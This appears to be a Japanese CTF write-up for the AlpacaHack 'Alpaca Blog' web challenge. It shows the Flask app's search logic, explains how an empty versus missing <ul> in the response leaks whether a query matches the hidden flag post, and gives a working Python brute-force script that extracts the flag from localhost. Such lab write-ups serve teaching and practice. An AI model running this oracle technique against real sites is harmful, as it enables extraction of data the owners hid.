---
title: Daily-AlpacaHack 「Alpaca Blog」Easy Writeup
description: 検索処理のオラクルを利用したフラグ文字列の総当たり
date: 2026-07-21 22:28:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, web]
---

# 20260720-daily_alpaca-web-easy-alpaca_blog

## Summary

本問は，検索処理のオラクル (`filtered` の有無によるHTML出力結果の違い) を利用して，総当たりでフラグを復元するWeb問題です．

> - **Category**: Web
> - **Description**: LLMがあればブログ書くの簡単だな
> - **Tools & TechStack**:
> 	- Python
> 	- BeautifulSoup
> - **Release**: 2026/07/20
{: .prompt-info }

**階層構造**
```
.
├── compose.yaml
└── web
    ├── app.py
    ├── Dockerfile
    └── templates
        └── index.html

3 directories, 4 files
```

---
## ソースコードの調査

`app.py` を見ると，`/` エンドポイントへの `q` クエリに指定した文字列が `posts[]` 配列の `title` 又は `content` に含まれる場合に，上位4件がレスポンスされるようになっています．  
また，検索結果としてヒットした記事の中に `title` が `Flag` の記事が含まれていた場合，その記事はレスポンスの配列から除外される仕組みになっています．

`web/app.py`
```python
from flask import Flask, render_template, request
import re
import os

app = Flask(__name__)

FLAG = os.environ.get("FLAG", "Alpaca{dummy}")
assert re.fullmatch(r"Alpaca{\w+}", FLAG), "Invalid flag format"

posts = [
    {
        "title": "Flag",
        "content": FLAG
    },
	#...
]

@app.get("/")
def index():

    q = request.args.get("q", "")
    filtered = [post for post in posts if q in post["title"] or q in post["content"]][:4] # title・contentにqが含まれるものの上位4件

    # 検索結果が0件
    if len(filtered) == 0:
        return render_template("index.html", filtered=None)

    return render_template("index.html", filtered=[post for post in filtered if post["title"] != "Flag"]) # titleがFlagである記事を除外

if __name__ == "__main__":  
    app.run(host="0.0.0.0", port=3000)

```

### オラクル的実装

直接 `Flag` の記事を読むことはできません．  
しかし，`q` クエリパラメータに `Flag` の一部が含まれる場合と，そうでない場合でレスポンスが異なるオラクル的な構造になっています．  

- 検索結果がゼロ件の時は，`if len(filtered) == 0:` によって，`filtered=None` の結果が返ります．ここで，`index.html` はタグを生成しません．
- しかし，検索に `Flag` の一部が含まれる場合は，`filtered=[post for post in filtered if post["title"] != "Flag"]` によって，**空の配列 (又はその他の記事)** が返ってきます．これは，`iterable` なため，`<ul>` が生成されます．

この差異を利用して，総当たりすることができます．

`index.html`
{% raw %}
```html
	<main>
	<!-- ... -->
	
        {% if filtered is iterable %}
            <ul>
                {% for post in filtered %}
                    <li>
                        <article>
                            <h2>{{ post.title }}</h2>
                            <p>{{ post.content }}</p>
                        </article>
                    </li>
                {% endfor %}
            </ul>
        {% endif %}
    </main>
```
{% endraw %}

## オラクルを利用したブルートフォース攻撃

Flagが `Alpaca{}` の形式であることは既知なため，以下のように `<main> <ul>` の有無で判定できます．

- **`<main>` 内に `<ul>` タグが存在しない**: `filtered = None`
- **`<main>` 内に中身が空の `<ul></ul>` タグが存在する**: `filtered = []`

`brute.py`
```python
import string
import requests
import time
import random
from bs4 import BeautifulSoup 

words = (
    string.ascii_lowercase +
    string.ascii_uppercase +
    string.digits +
    "_-!?}"
)

flag = list("Alpaca{")

while (flag[-1] != "}"):
    for word in words:
        url = f"http://localhost:3000?q={''.join(flag)}{word}"
        time.sleep(random.uniform(0.05, 0.5))
        res = requests.get(url)
        soup = BeautifulSoup(res.text, 'html.parser')
        
        if soup.select_one("main ul"):
            flag.append(word)
            print(flag)
            break
        else:
            continue

print("".join(flag))
```

**`brute.py` の実行結果**
```shell
$ python3 brute.py
['A', 'l', 'p', 'a', 'c', 'a', '{', 'R']
#...
['A', 'l', 'p', 'a', 'c', 'a', '{', 'R', 'E', 'D', 'A', 'C', 'T', 'E', 'D', '}']
Alpaca{REDACTED}
```

---